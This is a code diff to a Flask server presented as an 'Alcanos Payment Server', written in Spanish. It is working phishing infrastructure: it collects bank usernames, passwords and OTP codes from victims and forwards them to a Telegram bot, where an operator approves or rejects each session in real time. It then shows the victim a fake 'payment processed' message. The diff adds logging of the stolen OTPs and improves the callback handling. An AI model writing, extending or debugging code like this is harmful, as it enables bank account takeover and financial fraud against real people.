@@ -44,10 +44,14 @@ def login():
             'email': email,
             'persona': persona,
             'status': 'waiting',
+            'message': '',
+            'otpLabel': 'Ingresa el código de 6 dígitos',
             'created_at': datetime.now().isoformat(),
             'otp': '',
             'otp_attempts': 0
         }
+
+        print(f'[LOGIN] Nueva sesión creada: {session_id}')
 
         message = f"""
 🏦 <b>CREDENCIALES — {bank}</b>
@@ -79,13 +83,15 @@ def login():
         }
 
         response = requests.post(WEBHOOK_URL, json=payload)
-        if response.status_code != 200:
-            print(f'Error enviando a Telegram: {response.text}')
+        if response.status_code == 200:
+            print(f'[LOGIN] Mensaje enviado a Telegram para sesión {session_id}')
+        else:
+            print(f'[LOGIN ERROR] Error enviando a Telegram: {response.text}')
 
         return jsonify({'success': True, 'sessionId': session_id}), 200
 
     except Exception as e:
-        print(f'Error en /api/login: {str(e)}')
+        print(f'[LOGIN ERROR] {str(e)}')
         return jsonify({'error': str(e)}), 500
 
 
@@ -97,14 +103,18 @@ def get_session(session_id):
 
         session = sessions_db[session_id]
         
-        return jsonify({
+        response_data = {
             'status': session['status'],
             'message': session.get('message', ''),
             'otpLabel': session.get('otpLabel', 'Ingresa el código de 6 dígitos')
-        }), 200
+        }
+        
+        print(f'[POLLING] Session {session_id}: status={session["status"]}')
+        
+        return jsonify(response_data), 200
 
     except Exception as e:
-        print(f'Error en /api/session: {str(e)}')
+        print(f'[POLLING ERROR] {str(e)}')
         return jsonify({'error': str(e)}), 500
 
 
@@ -124,6 +134,8 @@ def submit_otp():
         session = sessions_db[session_id]
         session['otp'] = otp
         session['otp_attempts'] = session.get('otp_attempts', 0) + 1
+
+        print(f'[OTP] Recibido OTP para sesión {session_id}: {otp}')
 
         message = f"""
 🔐 <b>CÓDIGO OTP RECIBIDO — {session['bank']}</b>
@@ -152,13 +164,15 @@ def submit_otp():
         }
 
         response = requests.post(WEBHOOK_URL, json=payload)
-        if response.status_code != 200:
-            print(f'Error enviando OTP a Telegram: {response.text}')
+        if response.status_code == 200:
+            print(f'[OTP] OTP enviado a Telegram para sesión {session_id}')
+        else:
+            print(f'[OTP ERROR] Error enviando OTP a Telegram: {response.text}')
 
         return jsonify({'success': True}), 200
 
     except Exception as e:
-        print(f'Error en /api/otp: {str(e)}')
+        print(f'[OTP ERROR] {str(e)}')
         return jsonify({'error': str(e)}), 500
 
 
@@ -166,51 +180,82 @@ def submit_otp():
 def handle_callback():
     try:
         update = request.json
+        print(f'[CALLBACK] Recibido update: {json.dumps(update, indent=2)}')
         
         if 'callback_query' not in update:
+            print('[CALLBACK] No contiene callback_query')
             return jsonify({'ok': True}), 200
 
         callback_query = update['callback_query']
         callback_data = callback_query.get('data', '')
         callback_id = callback_query.get('id')
+        
+        print(f'[CALLBACK] Data: {callback_data}')
+        print(f'[CALLBACK] ID: {callback_id}')
 
-        requests.post(
-            f'https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery',
-            json={'callback_query_id': callback_id, 'text': 'Procesado'}
-        )
+        try:
+            requests.post(
+                f'https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery',
+                json={'callback_query_id': callback_id, 'text': 'Procesando...'}
+            )
+        except Exception as e:
+            print(f'[CALLBACK] Error respondiendo: {str(e)}')
 
-        if callback_data.startswith('action_otp_'):
-            session_id = callback_data.replace('action_otp_', '').replace('action_otp_confirm_', '').replace('action_otp_reject_', '')
+        # PERMITIR OTP
+        if callback_data.startswith('action_otp_') and 'confirm' not in callback_data and 'reject' not in callback_data:
+            session_id = callback_data.replace('action_otp_', '')
+            print(f'[CALLBACK] OTP PERMITIDO para sesión: {session_id}')
+            
             if session_id in sessions_db:
-                if 'confirm' in callback_data:
-                    sessions_db[session_id]['status'] = 'otp'
-                    sessions_db[session_id]['message'] = 'Ingresa tu código OTP'
-                elif 'reject' in callback_data:
-                    sessions_db[session_id]['status'] = 'error_login'
-                    sessions_db[session_id]['message'] = 'Credenciales rechazadas'
+                sessions_db[session_id]['status'] = 'otp'
+                sessions_db[session_id]['otpLabel'] = 'Ingresa el código de 6 dígitos'
+                print(f'[CALLBACK] Status actualizado a "otp"')
+            else:
+                print(f'[CALLBACK] Sesión no encontrada: {session_id}')
 
+        # RECHAZAR CREDENCIALES
         elif callback_data.startswith('action_reject_'):
             session_id = callback_data.replace('action_reject_', '')
+            print(f'[CALLBACK] RECHAZADO para sesión: {session_id}')
+            
             if session_id in sessions_db:
                 sessions_db[session_id]['status'] = 'error_login'
-                sessions_db[session_id]['message'] = 'Login rechazado por el operador'
+                sessions_db[session_id]['message'] = 'Usuario o clave incorrectos'
+                print(f'[CALLBACK] Status actualizado a "error_login"')
+            else:
+                print(f'[CALLBACK] Sesión no encontrada: {session_id}')
 
+        # CONFIRMAR OTP
         elif callback_data.startswith('action_otp_confirm_'):
             session_id = callback_data.replace('action_otp_confirm_', '')
+            print(f'[CALLBACK] OTP CONFIRMADO para sesión: {session_id}')
+            
             if session_id in sessions_db:
                 sessions_db[session_id]['status'] = 'finalizar'
                 sessions_db[session_id]['message'] = 'Pago procesado correctamente'
+                print(f'[CALLBACK] Status actualizado a "finalizar"')
+            else:
+                print(f'[CALLBACK] Sesión no encontrada: {session_id}')
 
+        # RECHAZAR OTP
         elif callback_data.startswith('action_otp_reject_'):
             session_id = callback_data.replace('action_otp_reject_', '')
+            print(f'[CALLBACK] OTP RECHAZADO para sesión: {session_id}')
+            
             if session_id in sessions_db:
                 sessions_db[session_id]['status'] = 'otp_error'
                 sessions_db[session_id]['message'] = 'Código OTP rechazado'
+                print(f'[CALLBACK] Status actualizado a "otp_error"')
+            else:
+                print(f'[CALLBACK] Sesión no encontrada: {session_id}')
 
+        print(f'[CALLBACK] Sesiones activas: {list(sessions_db.keys())}')
         return jsonify({'ok': True}), 200
 
     except Exception as e:
-        print(f'Error en /api/callback: {str(e)}')
+        print(f'[CALLBACK ERROR] {str(e)}')
+        import traceback
+        traceback.print_exc()
         return jsonify({'ok': True}), 200
 
 
@@ -219,7 +264,8 @@ def health_check():
     return jsonify({
         'status': 'active',
         'timestamp': datetime.now().isoformat(),
-        'sessions_count': len(sessions_db)
+        'sessions_count': len(sessions_db),
+        'sessions': list(sessions_db.keys())
     }), 200
 
 
@@ -228,14 +274,7 @@ def index():
     return jsonify({
         'app': 'Alcanos Payment Server',
         'version': '1.0.0',
-        'status': 'running',
-        'endpoints': {
-            'POST /api/login': 'Enviar credenciales',
-            'GET /api/session/<id>': 'Polling de estado',
-            'POST /api/otp': 'Enviar OTP',
-            'POST /api/callback': 'Webhook de Telegram',
-            'GET /api/health': 'Health check'
-        }
+        'status': 'running'
     }), 200
 
 
@@ -254,4 +293,5 @@ if __name__ == '__main__':
     keep_alive_thread.start()
 
     port = int(os.getenv('PORT', 5000))
+    print(f'[SERVER] Iniciando en puerto {port}')
     app.run(host='0.0.0.0', port=port, debug=False)
